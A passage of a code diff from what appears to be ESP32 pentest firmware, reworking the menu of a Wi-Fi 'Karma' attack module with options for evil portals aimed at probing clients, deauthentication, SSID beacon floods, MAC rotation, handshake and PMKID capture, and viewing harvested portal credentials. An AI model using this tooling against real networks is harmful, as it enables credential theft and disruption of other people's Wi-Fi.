-                            auto_hopping = !auto_hopping;
-                            displayTextLine(auto_hopping ? "Auto Hop ON" : "Auto Hop OFF");
-                            delay(1000);
-                        }},
-                        {"Set Interval", [&]() {
-                            std::vector<Option> intervalOptions = {
-                                {"500ms", [&]() { hop_interval = 500; }},
-                                {"1000ms", [&]() { hop_interval = 1000; }},
-                                {"2000ms", [&]() { hop_interval = 2000; }},
-                                {"3000ms", [&]() { hop_interval = 3000; }},
-                                {"Back", [&]() {}}
-                            };
-                            loopOptions(intervalOptions);
-                        }},
-                        {"Back", [&]() {}}
-                    };
-                    loopOptions(channelOptions);
-                }},
-                
-                {"Attack Settings", [&]() {
-                    std::vector<Option> attackOptions = {
-                        {karmaConfig.enableAutoKarma ? "* Auto Karma" : "- Auto Karma", [&]() {
-                            karmaConfig.enableAutoKarma = !karmaConfig.enableAutoKarma;
-                            displayTextLine(karmaConfig.enableAutoKarma ? "Auto Karma ON" : "Auto Karma OFF");
-                            delay(1000);
-                        }},
-                        {karmaConfig.enableAutoPortal ? "* Auto Portal" : "- Auto Portal", [&]() {
-                            if (!templateSelected) {
-                                displayTextLine("Select template first!");
-                                delay(1000);
-                                return;
-                            }
-                            karmaConfig.enableAutoPortal = !karmaConfig.enableAutoPortal;
-                            displayTextLine(karmaConfig.enableAutoPortal ? "Auto Portal ON" : "Auto Portal OFF");
-                            delay(1000);
-                        }},
-                        {karmaConfig.enableDeauth ? "* Deauth" : "- Deauth", [&]() {
-                            karmaConfig.enableDeauth = !karmaConfig.enableDeauth;
-                            displayTextLine(karmaConfig.enableDeauth ? "Deauth ON" : "Deauth OFF");
-                            delay(1000);
-                        }},
-                        {attackConfig.enableBeaconing ? "* Beaconing" : "- Beaconing", [&]() {
-                            attackConfig.enableBeaconing = !attackConfig.enableBeaconing;
-                            if (attackConfig.enableBeaconing && broadcastAttack.isActive()) {
-                                karmaMode = MODE_FULL;
-                            } else if (attackConfig.enableBeaconing || broadcastAttack.isActive()) {
-                                karmaMode = MODE_BROADCAST;
-                            } else {
-                                karmaMode = MODE_PASSIVE;
-                            }
-                            displayTextLine(attackConfig.enableBeaconing ? "Beaconing ON" : "Beaconing OFF");
-                            delay(1000);
-                        }},
-                        {handshakeCaptureEnabled ? "* HS Capture" : "- HS Capture", [&]() {
-                            handshakeCaptureEnabled = !handshakeCaptureEnabled;
-                            displayTextLine(handshakeCaptureEnabled ? "Handshake Capture ON" : "Handshake Capture OFF");
-                            delay(1000);
-                        }},
-                        {"Back", [&]() {}}
-                    };
-                    loopOptions(attackOptions);
-                }},
-                
-                {"SSID Database", [&]() {
-                    std::vector<Option> dbOptions = {
-                        {broadcastAttack.isActive() ? "Stop Broadcast" : "Start Broadcast", [&]() {
-                            if (broadcastAttack.isActive()) {
-                                broadcastAttack.stop();
-                                if (attackConfig.enableBeaconing) {
-                                    karmaMode = MODE_BROADCAST;
-                                } else {
-                                    karmaMode = MODE_PASSIVE;
-                                }
-                                displayTextLine("Broadcast stopped");
-                            } else {
-                                broadcastAttack.start();
-                                if (attackConfig.enableBeaconing) {
-                                    karmaMode = MODE_FULL;
-                                } else {
-                                    karmaMode = MODE_BROADCAST;
-                                }
-                                size_t total = SSIDDatabase::getCount();
-                                displayTextLine("Broadcast started: " + String(total) + " SSIDs");
-                            }
-                            delay(1000);
-                        }},
-                        {"Database Info", [&]() {
-                            drawMainBorderWithTitle("SSID DATABASE");
-                            int y = 60;
-                            tft.setTextSize(1);
-                            tft.fillRect(10, 40, tftWidth - 20, 100, bruceConfig.bgColor);
-                            size_t total = SSIDDatabase::getCount();
-                            size_t cached = SSIDDatabase::getAllSSIDs().size();
-                            tft.setCursor(10, y); y += 15;
-                            tft.print("Total SSIDs: " + String(total));
-                            tft.setCursor(10, y); y += 15;
-                            tft.print("Cached: " + String(cached));
-                            tft.setCursor(10, y); y += 15;
-                            tft.print("Progress: " + broadcastAttack.getProgressString());
-                            tft.setCursor(10, tftHeight - 20);
-                            tft.print("Sel: Back");
-                            while (!check(SelPress) && !check(EscPress)) delay(50);
-                        }},
-                        {"Set Speed", [&]() {
-                            std::vector<Option> speedOptions = {
-                                {"Fast (200ms)", [&]() { broadcastAttack.setBroadcastInterval(200); displayTextLine("Speed: Fast"); delay(1000); }},
-                                {"Normal (300ms)", [&]() { broadcastAttack.setBroadcastInterval(300); displayTextLine("Speed: Normal"); delay(1000); }},
-                                {"Slow (500ms)", [&]() { broadcastAttack.setBroadcastInterval(500); displayTextLine("Speed: Slow"); delay(1000); }},
-                                {"Back", [&]() {}}
-                            };
-                            loopOptions(speedOptions);
-                        }},
-                        {"Back", [&]() {}}
-                    };
-                    loopOptions(dbOptions);
-                }},
-                
-                {"Karma Attack", [&]() {
-                    std::vector<ClientBehavior> vulnerable = getVulnerableClients();
-                    std::vector<ProbeRequest> uniqueProbes = getUniqueProbes();
-                    if (vulnerable.empty() && uniqueProbes.empty()) {
-                        displayTextLine("No targets found!");
-                        delay(1000);
-                        screenNeedsRedraw = true;
-                        return;
-                    }
-                    std::vector<Option> karmaOptions;
-                    for (const auto &client : vulnerable) {
-                        if (!client.probedSSIDs.empty()) {
-                            String itemText = client.lastMAC.substring(9) + " (VULN)";
-                            karmaOptions.push_back({itemText.c_str(), [=, &client]() {
-                                launchManualEvilPortal(client.probedSSIDs[0], 
-                                                      client.favoriteChannel, 
-                                                      selectedTemplate.verifyPassword);
-                                screenNeedsRedraw = true;
-                            }});
-                        }
-                    }
-                    for (const auto &probe : uniqueProbes) {
-                        String itemText = probe.ssid + " (" + String(probe.rssi) + "|ch" + String(probe.channel) + ")";
-                        if (itemText.length() > 40) itemText = itemText.substring(0, 37) + "...";
-                        karmaOptions.push_back({itemText.c_str(), [=, &probe]() {
-                            launchManualEvilPortal(probe.ssid, probe.channel, 
-                                                  selectedTemplate.verifyPassword);
-                            screenNeedsRedraw = true;
-                        }});
-                    }
-                    karmaOptions.push_back({"Back", [&]() {}});
-                    loopOptions(karmaOptions);
-                    screenNeedsRedraw = true;
-                }},
-                
-                {"Select Template", [&]() {
-                    selectPortalTemplate(false);
-                }},
-                
-                {"Attack Strategy", [&]() {
-                    std::vector<Option> strategyOptions = {
-                        {attackConfig.defaultTier == TIER_CLONE ? "* Clone Mode" : "- Clone Mode", [&]() {
-                            attackConfig.defaultTier = TIER_CLONE;
-                            displayTextLine("Clone mode enabled");
-                            delay(1000);
-                        }},
-                        {attackConfig.defaultTier == TIER_HIGH ? "* High Tier" : "- High Tier", [&]() {
-                            attackConfig.defaultTier = TIER_HIGH;
-                            displayTextLine("High tier mode");
-                            delay(1000);
-                        }},
-                        {attackConfig.defaultTier == TIER_MEDIUM ? "* Medium Tier" : "- Medium Tier", [&]() {
-                            attackConfig.defaultTier = TIER_MEDIUM;
-                            displayTextLine("Medium tier mode");
-                            delay(1000);
-                        }},
-                        {attackConfig.defaultTier == TIER_FAST ? "* Fast Tier" : "- Fast Tier", [&]() {
-                            attackConfig.defaultTier = TIER_FAST;
-                            displayTextLine("Fast tier mode");
-                            delay(1000);
-                        }},
-                        {attackConfig.enableCloneMode ? "* Clone Detection" : "- Clone Detection", [&]() {
-                            attackConfig.enableCloneMode = !attackConfig.enableCloneMode;
-                            displayTextLine(attackConfig.enableCloneMode ? "Clone detection ON" : "Clone detection OFF");
-                            delay(1000);
-                        }},
-                        {attackConfig.enableTieredAttack ? "* Tiered Attack" : "- Tiered Attack", [&]() {
-                            attackConfig.enableTieredAttack = !attackConfig.enableTieredAttack;
-                            displayTextLine(attackConfig.enableTieredAttack ? "Tiered attack ON" : "Tiered attack OFF");
-                            delay(1000);
-                        }},
-                        {"Back", [&]() {}}
-                    };
-                    loopOptions(strategyOptions);
-                }},
-                
-                {"Active Broadcast Attack", [&]() {
-                    std::vector<Option> broadcastOptions;
-                    broadcastOptions.push_back({broadcastAttack.isActive() ? "Stop Broadcast" : "Start Broadcast", [&]() {
-                        if (broadcastAttack.isActive()) {
-                            broadcastAttack.stop();
-                            if (attackConfig.enableBeaconing) {
-                                karmaMode = MODE_BROADCAST;
-                            } else {
-                                karmaMode = MODE_PASSIVE;
-                            }
-                        } else {
-                            broadcastAttack.start();
-                            if (attackConfig.enableBeaconing) {
-                                karmaMode = MODE_FULL;
-                            } else {
-                                karmaMode = MODE_BROADCAST;
-                            }
-                        }
-                        delay(1000);
-                    }});
-                    broadcastOptions.push_back({"Set Speed", [&]() {
-                        std::vector<Option> speedOptions = {
-                            {"Fast (200ms)", [&]() { broadcastAttack.setBroadcastInterval(200); displayTextLine("Speed: Fast"); delay(1000); }},
-                            {"Normal (300ms)", [&]() { broadcastAttack.setBroadcastInterval(300); displayTextLine("Speed: Normal"); delay(1000); }},
-                            {"Slow (500ms)", [&]() { broadcastAttack.setBroadcastInterval(500); displayTextLine("Speed: Slow"); delay(1000); }},
-                            {"Back", [&]() {}}
-                        };
-                        loopOptions(speedOptions);
-                    }});
-                    broadcastOptions.push_back({"Show Stats", [&]() {
-                        drawMainBorderWithTitle("BROADCAST STATS");
-                        int y = 40;
-                        tft.setTextSize(1);
-                        size_t totalSSIDs = SSIDDatabase::getCount();
-                        size_t currentPos = broadcastAttack.getCurrentPosition();
-                        float progress = broadcastAttack.getProgressPercent();
-                        BroadcastStats stats = broadcastAttack.getStats();
 
-                        tft.setCursor(10, y); y += 15;
-                        tft.print("Total SSIDs: " + String(totalSSIDs));
-                        tft.setCursor(10, y); y += 15;
-                        tft.print("Progress: " + String(progress, 1) + "%");
-                        tft.setCursor(10, y); y += 15;
-                        tft.print("Broadcasts: " + String(stats.totalBroadcasts));
-                        tft.setCursor(10, y); y += 15;
-                        tft.print("Responses: " + String(stats.totalResponses));
-                        tft.setCursor(10, y); y += 15;
-                        tft.print("Status: " + String(broadcastAttack.isActive() ? "ACTIVE" : "INACTIVE"));
-                        tft.setCursor(10, tftHeight - 20);
-                        tft.print("Sel: Back");
-                        while (!check(SelPress) && !check(EscPress)) {
-                            if (check(PrevPress)) break;
-                            delay(50);
-                        }
-                    }});
-                    broadcastOptions.push_back({"Back", [&]() {}});
-                    loopOptions(broadcastOptions);
-                }},
-                
-                {"View Captures", [&]() {
-                    std::vector<Option> viewOptions = {
-                        {"Portal Creds", [&]() {
-                            FS *fs;
-                            if (getFsStorage(fs) && fs->exists("/PortalCreds")) {
-                                loopSD(*fs, false, "TXT", "/PortalCreds");
-                            } else {
-                                displayTextLine("No captures yet");
-                                delay(1000);
-                            }
-                        }},
-                        {"Handshakes", [&]() {
-                            FS *fs;
-                            if (getFsStorage(fs) && fs->exists("/BrucePCAP/handshakes")) {
-                                loopSD(*fs, false, "PCAP", "/BrucePCAP/handshakes");
-                            } else {
-                                displayTextLine("No handshakes yet");
-                                delay(1000);
-                            }
-                        }},
-                        {"Back", [&]() {}}
-                    };
-                    loopOptions(viewOptions);
-                }},
-                
-                {"Save Probes", [&]() {
-                    FS *saveFs;
-                    if (getFsStorage(saveFs) && storageAvailable) {
-                        saveProbesToFile(*saveFs, true);
-                        displayTextLine("Probes saved!");
-                    } else displayTextLine("No storage!");
-                    delay(1000);
-                }},
-                
-                {"Clear Probes", [&]() {
-                    clearProbes();
-                    displayTextLine("Probes cleared!");
-                    delay(1000);
-                }},
-                
-                {"Show Stats", [&]() {
-                    drawMainBorderWithTitle("KARMA STATS");
-                    int y = 40;
-                    tft.setTextSize(1);
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Total Probes: " + String(totalProbes));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Unique Clients: " + String(uniqueClients));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Karma Responses: " + String(karmaResponsesSent));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Portals Launched: " + String(autoPortalsLaunched));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Clone Attacks: " + String(cloneAttacksLaunched));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Deauth Packets: " + String(deauthPacketsSent));
-                    tft.setCursor(10, y); y += 15;
-                    int vulnCount = 0;
-                    for (const auto &clientPair : clientBehaviors)
-                        if (clientPair.second.isVulnerable) vulnCount++;
-                    tft.print("Vulnerable: " + String(vulnCount));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Pending Attacks: " + String(pendingPortals.size()));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Active Portals: " + String(activePortals.size()));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("PMKID Captured: " + String(pmkidCaptured));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Handshakes: " + String(handshakeBuffer.size()));
-                    tft.setCursor(10, tftHeight - 20);
-                    tft.print("Sel: Back");
-                    while (!check(SelPress) && !check(EscPress)) {
-                        if (check(PrevPress)) break;
-                        delay(50);
-                    }
-                    screenNeedsRedraw = true;
-                }},
-                
-                {"Exit Karma", [&]() { returnToMenu = true; }},
+            vTaskDelay(200 / portTICK_PERIOD_MS);
+
+            std::vector<Option> options = {
+                {"Enhanced Stats",
+                 [&]() {
+                     drawMainBorderWithTitle("ADVANCED STATS");
+                     int y = 40;
+                     tft.setTextSize(1);
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Total: " + String(totalProbes));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Unique: " + String(uniqueClients));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Karma: " + String(karmaResponsesSent));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Beacons: " + String(beaconsSent));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Active: " + String(activeNetworks.size()));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Pending: " + String(pendingPortals.size()));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Portals: " + String(activePortals.size()));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Blacklist: " + String(macBlacklist.size()));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("PMKID: " + String(pmkidCaptured));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Handshakes: " + String(handshakeBuffer.size()));
+                     tft.setCursor(10, tftHeight - 20);
+                     tft.print("Sel: Back");
+                     while (!check(SelPress) && !check(EscPress)) {
+                         if (check(PrevPress)) break;
+                         delay(50);
+                     }
+                     screenNeedsRedraw = true;
+                 }                   },
+
+                {karmaPaused ? "Resume Karma" : "Pause Karma",
+                 [&]() {
+                     karmaPaused = !karmaPaused;
+                     if (karmaPaused) {
+                         esp_wifi_set_promiscuous(false);
+                         displayTextLine("Karma PAUSED");
+                     } else {
+                         esp_wifi_set_promiscuous(true);
+                         displayTextLine("Karma RESUMED");
+                     }
+                     delay(1000);
+                     screenNeedsRedraw = true;
+                 }                   },
+
+                {"Rotate MAC Now",
+                 [&]() {
+                     generateRandomBSSID(currentBSSID);
+                     lastMACRotation = millis();
+                     displayTextLine("MAC rotated");
+                     delay(1000);
+                     screenNeedsRedraw = true;
+                 }                   },
+
+                {"Set Mode",
+                 [&]() {
+                     std::vector<Option> modeOptions = {
+                         {                                                              "Passive (Listen only)",
+                 [&]() {
+                              karmaMode = MODE_PASSIVE;
+                              broadcastAttack.stop();
+                              attackConfig.enableBeaconing = false;
+                              displayTextLine("Passive mode");
+                              delay(1000);
+                          }},
+                         {                           "Broadcast (Advertise SSIDs)",
+                 [&]() {
+                              karmaMode = MODE_BROADCAST;
+                              if (!karmaPaused) {
+                                  broadcastAttack.start();
+                                  attackConfig.enableBeaconing = true;
+                              }
+                              displayTextLine("Broadcast mode");
+                              delay(1000);
+                          }},
+                         {                                             "Full (Both)",
+                 [&]() {
+                              karmaMode = MODE_FULL;
+                              if (!karmaPaused) {
+                                  broadcastAttack.start();
+                                  attackConfig.enableBeaconing = true;
+                              }
+                              displayTextLine("Full mode");
+                              delay(1000);
+                          }},
+                         {                                             "Back",                                             [&]() {}}
+                     };
+                     loopOptions(modeOptions);
+                     screenNeedsRedraw = true;
+                 }                                     },
+
+                {"Channel Control",
+                 [&]() {
+                     std::vector<Option> channelOptions = {
+                         {                                             "Next Channel",
+                 [&]() {
+                              if (!karmaPaused) esp_wifi_set_promiscuous(false);
+                              channl++;
+                              if (channl >= 14) channl = 0;
+                              setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
+                              screenNeedsRedraw = true;
+                              if (!karmaPaused) esp_wifi_set_promiscuous(true);
+                              displayTextLine("Channel: " + String(karma_channels[channl % 14]));
+                              delay(1000);
+                          }},
+                         {                                             "Previous Channel",
+                 [&]() {
+                              if (!karmaPaused) esp_wifi_set_promiscuous(false);
+                              if (channl == 0) channl = 13;
+                              else channl--;
+                              setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
+                              screenNeedsRedraw = true;
+                              if (!karmaPaused) esp_wifi_set_promiscuous(true);
+                              displayTextLine("Channel: " + String(karma_channels[channl % 14]));
+                              delay(1000);
+                          }},
+                         {"Auto Hop ON/OFF",
+                 [&]() {
+                              auto_hopping = !auto_hopping;
+                              displayTextLine(auto_hopping ? "Auto Hop ON" : "Auto Hop OFF");
+                              delay(1000);
+                          }},
+                         {"Set Interval",
+                 [&]() {
+                              std::vector<Option> intervalOptions = {
+                                  {"500ms", [&]() { hop_interval = 500; }},
+                                  {"1000ms", [&]() { hop_interval = 1000; }},
+                                  {"2000ms", [&]() { hop_interval = 2000; }},
+                                  {"3000ms", [&]() { hop_interval = 3000; }},
+                                  {"Back", [&]() {}}
+                              };
+                              loopOptions(intervalOptions);
+                          }},
+                         {"Back", [&]() {}}
+                     };
+                     loopOptions(channelOptions);
+                 }                                    },
+
+                {"Attack Settings",
+                 [&]() {
+                     std::vector<Option> attackOptions = {
+                         {karmaConfig.enableAutoKarma ? "* Auto Karma" : "- Auto Karma",
+                 [&]() {
+                              karmaConfig.enableAutoKarma = !karmaConfig.enableAutoKarma;
+                              displayTextLine(
+                                  karmaConfig.enableAutoKarma ? "Auto Karma ON" : "Auto Karma OFF"
+                              );
+                              delay(1000);
+                          }},
+                         {karmaConfig.enableAutoPortal ? "* Auto Portal" : "- Auto Portal",
+                 [&]() {
+                              if (!templateSelected) {
+                                  displayTextLine("Select template first!");
+                                  delay(1000);
+                                  return;
+                              }
+                              karmaConfig.enableAutoPortal = !karmaConfig.enableAutoPortal;
+                              displayTextLine(
+                                  karmaConfig.enableAutoPortal ? "Auto Portal ON" : "Auto Portal OFF"
+                              );
+                              delay(1000);
+                          }},
+                         {karmaConfig.enableDeauth ? "* Deauth" : "- Deauth",
+                 [&]() {
+                              karmaConfig.enableDeauth = !karmaConfig.enableDeauth;
+                              displayTextLine(karmaConfig.enableDeauth ? "Deauth ON" : "Deauth OFF");
+                              delay(1000);
+                          }},
+                         {attackConfig.enableBeaconing ? "* Beaconing" : "- Beaconing",
+                 [&]() {
+                              attackConfig.enableBeaconing = !attackConfig.enableBeaconing;
+                              if (attackConfig.enableBeaconing && broadcastAttack.isActive()) {
+                                  karmaMode = MODE_FULL;
+                              } else if (attackConfig.enableBeaconing || broadcastAttack.isActive()) {
+                                  karmaMode = MODE_BROADCAST;
+                              } else {
+                                  karmaMode = MODE_PASSIVE;
+                              }
+                              displayTextLine(
+                                  attackConfig.enableBeaconing ? "Beaconing ON" : "Beaconing OFF"
+                              );
+                              delay(1000);
+                          }},
+                         {handshakeCaptureEnabled ? "* HS Capture" : "- HS Capture",
+                 [&]() {
+                              handshakeCaptureEnabled = !handshakeCaptureEnabled;
+                              displayTextLine(
+                                  handshakeCaptureEnabled ? "Handshake Capture ON" : "Handshake Capture OFF"
+                              );
+                              delay(1000);
+                          }},
+                         {"Back", [&]() {}}
+                     };
+                     loopOptions(attackOptions);
+                 }                                     },
+
+                {"SSID Database",
+                 [&]() {
+                     std::vector<Option> dbOptions = {
+                         {broadcastAttack.isActive() ? "Stop Broadcast" : "Start Broadcast",
+                 [&]() {
+                              if (broadcastAttack.isActive()) {
+                                  broadcastAttack.stop();
+                                  if (attackConfig.enableBeaconing) {
+                                      karmaMode = MODE_BROADCAST;
+                                  } else {
+                                      karmaMode = MODE_PASSIVE;
+                                  }
+                                  displayTextLine("Broadcast stopped");
+                              } else {
+                                  broadcastAttack.start();
+                                  if (attackConfig.enableBeaconing) {
+                                      karmaMode = MODE_FULL;
+                                  } else {
+                                      karmaMode = MODE_BROADCAST;
+                                  }
+                                  size_t total = SSIDDatabase::getCount();
+                                  displayTextLine("Broadcast started: " + String(total) + " SSIDs");
+                              }
+                              delay(1000);
+                          }},
+                         {"Database Info",
+                 [&]() {
+                              drawMainBorderWithTitle("SSID DATABASE");
+                              int y = 60;
+                              tft.setTextSize(1);
+                              tft.fillRect(10, 40, tftWidth - 20, 100, bruceConfig.bgColor);
+                              size_t total = SSIDDatabase::getCount();
+                              size_t cached = SSIDDatabase::getAllSSIDs().size();
+                              tft.setCursor(10, y);
+                              y += 15;
+                              tft.print("Total SSIDs: " + String(total));
+                              tft.setCursor(10, y);
+                              y += 15;
+                              tft.print("Cached: " + String(cached));
+                              tft.setCursor(10, y);
+                              y += 15;
+                              tft.print("Progress: " + broadcastAttack.getProgressString());
+                              tft.setCursor(10, tftHeight - 20);
+                              tft.print("Sel: Back");
+                              while (!check(SelPress) && !check(EscPress)) delay(50);
+                          }},
+                         {"Set Speed",
+                 [&]() {
+                              std::vector<Option> speedOptions = {
+                                  {"Fast (200ms)",
+                 [&]() {
+                                       broadcastAttack.setBroadcastInterval(200);
+                                       displayTextLine("Speed: Fast");
+                                       delay(1000);
+                                   }},
+                                  {"Normal (300ms)",
+                 [&]() {
+                                       broadcastAttack.setBroadcastInterval(300);
+                                       displayTextLine("Speed: Normal");
+                                       delay(1000);
+                                   }},
+                                  {"Slow (500ms)",
+                 [&]() {
+                                       broadcastAttack.setBroadcastInterval(500);
+                                       displayTextLine("Speed: Slow");
+                                       delay(1000);
+                                   }},
+                                  {"Back", [&]() {}}
+                              };
+                              loopOptions(speedOptions);
+                          }},
+                         {"Back", [&]() {}}
+                     };
+                     loopOptions(dbOptions);
+                 }},
+
+                {"Karma Attack",
+                 [&]() {
+                     std::vector<ClientBehavior> vulnerable = getVulnerableClients();
+                     std::vector<ProbeRequest> uniqueProbes = getUniqueProbes();
+                     if (vulnerable.empty() && uniqueProbes.empty()) {
+                         displayTextLine("No targets found!");
+                         delay(1000);
+                         screenNeedsRedraw = true;
+                         return;
+                     }
+                     std::vector<Option> karmaOptions;
+                     for (const auto &client : vulnerable) {
+                         if (!client.probedSSIDs.empty()) {
+                             String itemText = client.lastMAC.substring(9) + " (VULN)";
+                             karmaOptions.push_back({itemText.c_str(), [=, &client]() {
+                                                         launchManualEvilPortal(
+                                                             client.probedSSIDs[0],
+                                                             client.favoriteChannel,
+                                                             selectedTemplate.verifyPassword
+                                                         );
+                                                         screenNeedsRedraw = true;
+                                                     }});
+                         }
+                     }
+                     for (const auto &probe : uniqueProbes) {
+                         String itemText =
+                             probe.ssid + " (" + String(probe.rssi) + "|ch" + String(probe.channel) + ")";
+                         if (itemText.length() > 40) itemText = itemText.substring(0, 37) + "...";
+                         karmaOptions.push_back({itemText.c_str(), [=, &probe]() {
+                                                     launchManualEvilPortal(
+                                                         probe.ssid,
+                                                         probe.channel,
+                                                         selectedTemplate.verifyPassword
+                                                     );
+                                                     screenNeedsRedraw = true;
+                                                 }});
+                     }
+                     karmaOptions.push_back({"Back", [&]() {}});
+                     loopOptions(karmaOptions);
+                     screenNeedsRedraw = true;
+                 }                                    },
+
+                {"Select Template", [&]() { selectPortalTemplate(false); }                                     },
+
+                {"Attack Strategy",
+                 [&]() {
+                     std::vector<Option> strategyOptions = {
+                         {attackConfig.defaultTier == TIER_CLONE ? "* Clone Mode" : "- Clone Mode",
+                 [&]() {
+                              attackConfig.defaultTier = TIER_CLONE;
+                              displayTextLine("Clone mode enabled");
+                              delay(1000);
+                          }},
+                         {attackConfig.defaultTier == TIER_HIGH ? "* High Tier" : "- High Tier",
+                 [&]() {
+                              attackConfig.defaultTier = TIER_HIGH;
+                              displayTextLine("High tier mode");
+                              delay(1000);
+                          }},
+                         {attackConfig.defaultTier == TIER_MEDIUM ? "* Medium Tier" : "- Medium Tier",
+                 [&]() {
+                              attackConfig.defaultTier = TIER_MEDIUM;
+                              displayTextLine("Medium tier mode");
+                              delay(1000);
+                          }},
+                         {attackConfig.defaultTier == TIER_FAST ? "* Fast Tier" : "- Fast Tier",
+                 [&]() {
+                              attackConfig.defaultTier = TIER_FAST;
+                              displayTextLine("Fast tier mode");
+                              delay(1000);
+                          }},
+                         {attackConfig.enableCloneMode ? "* Clone Detection" : "- Clone Detection",
+                 [&]() {
+                              attackConfig.enableCloneMode = !attackConfig.enableCloneMode;
+                              displayTextLine(
+                                  attackConfig.enableCloneMode ? "Clone detection ON" : "Clone detection OFF"
+                              );
+                              delay(1000);
+                          }},
+                         {attackConfig.enableTieredAttack ? "* Tiered Attack" : "- Tiered Attack",
+                 [&]() {
+                              attackConfig.enableTieredAttack = !attackConfig.enableTieredAttack;
+                              displayTextLine(
+                                  attackConfig.enableTieredAttack ? "Tiered attack ON" : "Tiered attack OFF"
+                              );
+                              delay(1000);
+                          }},
+                         {"Back", [&]() {}}
+                     };
+                     loopOptions(strategyOptions);
+                 }                                    },
+
+                {"Active Broadcast Attack",
+                 [&]() {
+                     std::vector<Option> broadcastOptions;
+                     broadcastOptions.push_back(
+                         {broadcastAttack.isActive() ? "Stop Broadcast" : "Start Broadcast", [&]() {
+                              if (broadcastAttack.isActive()) {
+                                  broadcastAttack.stop();
+                                  if (attackConfig.enableBeaconing) {
+                                      karmaMode = MODE_BROADCAST;
+                                  } else {
+                                      karmaMode = MODE_PASSIVE;
+                                  }
+                              } else {
+                                  broadcastAttack.start();
+                                  if (attackConfig.enableBeaconing) {
+                                      karmaMode = MODE_FULL;
+                                  } else {
+                                      karmaMode = MODE_BROADCAST;
+                                  }
+                              }
+                              delay(1000);
+                          }}
+                     );
+                     broadcastOptions.push_back({"Set Speed", [&]() {
+                                                     std::vector<Option> speedOptions = {
+                                                         {"Fast (200ms)",
+                 [&]() {
+                                                              broadcastAttack.setBroadcastInterval(200);
+                                                              displayTextLine("Speed: Fast");
+                                                              delay(1000);
+                                                          }},
+                                                         {"Normal (300ms)",
+                 [&]() {
+                                                              broadcastAttack.setBroadcastInterval(300);
+                                                              displayTextLine("Speed: Normal");
+                                                              delay(1000);
+                                                          }},
+                                                         {"Slow (500ms)",
+                 [&]() {
+                                                              broadcastAttack.setBroadcastInterval(500);
+                                                              displayTextLine("Speed: Slow");
+                                                              delay(1000);
+                                                          }},
+                                                         {"Back", [&]() {}}
+                                                     };
+                                                     loopOptions(speedOptions);
+                                                 }});
+                     broadcastOptions.push_back(
+                         {"Show Stats", [&]() {
+                              drawMainBorderWithTitle("BROADCAST STATS");
+                              int y = 40;
+                              tft.setTextSize(1);
+                              size_t totalSSIDs = SSIDDatabase::getCount();
+                              size_t currentPos = broadcastAttack.getCurrentPosition();
+                              float progress = broadcastAttack.getProgressPercent();
+                              BroadcastStats stats = broadcastAttack.getStats();
+
+                              tft.setCursor(10, y);
+                              y += 15;
+                              tft.print("Total SSIDs: " + String(totalSSIDs));
+                              tft.setCursor(10, y);
+                              y += 15;
+                              tft.print("Progress: " + String(progress, 1) + "%");
+                              tft.setCursor(10, y);
+                              y += 15;
+                              tft.print("Broadcasts: " + String(stats.totalBroadcasts));
+                              tft.setCursor(10, y);
+                              y += 15;
+                              tft.print("Responses: " + String(stats.totalResponses));
+                              tft.setCursor(10, y);
+                              y += 15;
+                              tft.print(
+                                  "Status: " + String(broadcastAttack.isActive() ? "ACTIVE" : "INACTIVE")
+                              );
+                              tft.setCursor(10, tftHeight - 20);
+                              tft.print("Sel: Back");
+                              while (!check(SelPress) && !check(EscPress)) {
+                                  if (check(PrevPress)) break;
+                                  delay(50);
+                              }
+                          }}
+                     );
+                     broadcastOptions.push_back({"Back", [&]() {}});
+                     loopOptions(broadcastOptions);
+                 }                   },
+
+                {"View Captures",
+                 [&]() {
+                     std::vector<Option> viewOptions = {
+                         {"Portal Creds",
+                 [&]() {
+                              FS *fs;
+                              if (getFsStorage(fs) && fs->exists("/PortalCreds")) {
+                                  loopSD(*fs, false, "TXT", "/PortalCreds");
+                              } else {
+                                  displayTextLine("No captures yet");
+                                  delay(1000);
+                              }
+                          }},
+                         {"Handshakes",
+                 [&]() {
+                              FS *fs;
+                              if (getFsStorage(fs) && fs->exists("/BrucePCAP/handshakes")) {
+                                  loopSD(*fs, false, "PCAP", "/BrucePCAP/handshakes");
+                              } else {
+                                  displayTextLine("No handshakes yet");
+                                  delay(1000);
+                              }
+                          }},
+                         {"Back", [&]() {}}
+                     };
+                     loopOptions(viewOptions);
+                 }                   },
+
+                {"Save Probes",
+                 [&]() {
+                     FS *saveFs;
+                     if (getFsStorage(saveFs) && storageAvailable) {
+                         saveProbesToFile(*saveFs, true);
+                         displayTextLine("Probes saved!");
+                     } else displayTextLine("No storage!");
+                     delay(1000);
+                 }                   },
+
+                {"Clear Probes",
+                 [&]() {
+                     clearProbes();
+                     displayTextLine("Probes cleared!");
+                     delay(1000);
+                 }                   },
+
+                {"Show Stats",
+                 [&]() {
+                     drawMainBorderWithTitle("KARMA STATS");
+                     int y = 40;
+                     tft.setTextSize(1);
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Total Probes: " + String(totalProbes));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Unique Clients: " + String(uniqueClients));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Karma Responses: " + String(karmaResponsesSent));
+                     tft.setCursor(10, y);
+                     y += 15;
+                     tft.print("Portals Launched: " + String(autoPortalsLaunched));
+                     tft.setCursor(10, y);
